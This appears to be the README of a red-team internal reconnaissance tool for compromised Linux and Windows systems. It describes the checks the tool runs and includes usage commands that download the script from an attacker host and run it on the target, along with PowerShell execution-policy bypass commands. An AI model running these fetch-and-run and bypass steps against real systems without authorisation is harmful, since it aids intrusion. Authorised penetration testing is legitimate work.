# Internal Reconnaissance Phase

An internal investigation is carried out to gain knowledge about the compromised system. The aim is to obtain information that may be of interest for further action. System-specific tools are often used for this purpose.

This script reveals various information ([see Checks](#checks)) of a Linux system that may be useful in Internal Reconnaissance. For windows systems there is also a powershell script available. Check the [Windows](#windows) part for more information.

## Usage

From github:
```sh
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/internal-recon/internal-recon.sh
sh internal-recon.sh
```
Local network:
```sh
# Host
sh internal-recon.sh -w
# Target
curl -LJO <Host>:8000/internal-recon.sh #or
curl <Host>:8000/internal-recon.sh > internal-recon.sh #or
wget <Host>:8000/internal-recon.sh
sh internal-recon.sh
```

### Parameters

```
sh internal-recon.sh -h

Usage: internal-recon.sh [options]

Options:
-h    Show this help message
-w    Serves an local web server for transferring files

Output:
-c    No colours. Without colours, the output can probably be read better
-q    Quiet. No banner and no advisory displayed
```

## Checks

Script collecting information about:  

- System
- Network
- User & groups
- Jobs/tasks
- Services/processes
- Software
- Interesting files
- Container

## Results

Results saved to files in current directory and printed to stdout.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems.

-----

## Windows

This powershell script is intended to serve as a template and is far from a finished script. 
It does simple internal recon.

### Usage

From github:  
Download powershell script from github and run it:
```
.\internal-recon.ps1
```
Local network:  
Start webserver with -w
```
# Host
sh internal-recon.sh -w
```
Download script from `http://<Host>:8000/` an run it:
```
.\internal-recon.ps1
```

## Results

Results saved to files in current directory and printed to terminal.

### Execution Policy Bypass

If there are problems with the Execution Policy on Windows, try:
```
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
# or
Get-Content .\internal-recon.ps1 | PowerShell.exe -noprofile -
```
or check https://gist.github.com/adithyan-ak/b5d0f2f98784e55f6edee248c85b4c5f for possible bypass commands.

-----

## Additional Information

### Search files and directories in Linux

Examples:
```
# search files and directories by keyword within "/" directory (case insensitive)
sudo find / -iname <keyword> 2>/dev/null

# search directories by keyword within "/" directory (case insensitive)
sudo find / -type d -iname some_directory 2>/dev/null

# search files with specific file extension within "/home" directory (case sensitive)
sudo find /home -type f -name "*.conf"

# search files with executable permission
sudo find /home -perm /a=x
```
